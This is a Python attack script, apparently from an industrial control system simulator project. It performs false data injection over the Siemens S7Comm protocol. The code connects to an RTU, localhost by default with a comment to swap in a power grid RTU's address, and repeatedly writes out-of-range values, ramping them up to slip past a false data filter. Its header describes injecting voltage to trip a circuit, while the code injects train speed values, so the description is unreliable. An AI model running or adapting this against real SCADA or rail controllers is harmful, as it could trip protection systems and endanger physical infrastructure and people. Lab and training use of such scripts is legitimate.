#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        attackScript_FDI.py
#
# Purpose:     This modulde is a used to demo injecting the out of range false 
#              voltage value to RTU to trigger the SCADA system's power loads
#              c protection mechanism to trip the circuit. The communication 
#              is based on Siemens S7Comm protocol.
#              The S7comm communication client lib link: 
#              https://github.com/LiuYuancheng/PLC_and_RTU_Simulator/blob/main/S7Comm_RTU_Simulator/src/snap7Comm.py
#
# Author:      Yuancheng Liu
#
# Created:     2024/10/15
# Version:     v_0.1.3
# Copyright:   Copyright (c) 2024 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import os
import time

print("Current working directory is : %s" % os.getcwd())
DIR_PATH = dirpath = os.path.dirname(os.path.abspath(__file__))
print("Current source code location : [%s]" % dirpath)

#-----------------------------------------------------------------------------
print("Test import S7Comm lib: ")
try:
    import snap7Comm
    from snap7Comm import BOOL_TYPE, INT_TYPE, REAL_TYPE
except ImportError as err:
    print("Import error: %s" % str(err))
    exit()
print("- pass")

#-----------------------------------------------------------------------------
# Import dll file for windows platform.
libpath = os.path.join(dirpath, 'snap7.dll')
print("Import snap7 dll path: %s" % str(libpath))
if os.path.exists(libpath):
    print("- pass")
else:
    print("Error: not file the dll file.")
    exit()

#-----------------------------------------------------------------------------
# Test cases:
RTU_ANTENNA_IP= '127.0.0.1' # change this IP to the Power grid RTU02 IP address
RADIO_FREQUEnCY = 102 # use the opened port as the radio frequency.

client = snap7Comm.s7CommClient(RTU_ANTENNA_IP, rtuPort=RADIO_FREQUEnCY, snapLibPath=libpath)
connection = client.checkConn()
initSpeed = 75
if connection:
    for i in range(250):
        initSpeed += 10 # increase speed to avoid the false data filter activate.
        initSpeed = min(initSpeed, 200)
        print("Attack: Start inject out of range speed value = %s km to the train RTU " %str(initSpeed))
        client.setAddressVal(5, 2, initSpeed, dataType=INT_TYPE)
        time.sleep(0.2)
        print("Inject Done !")

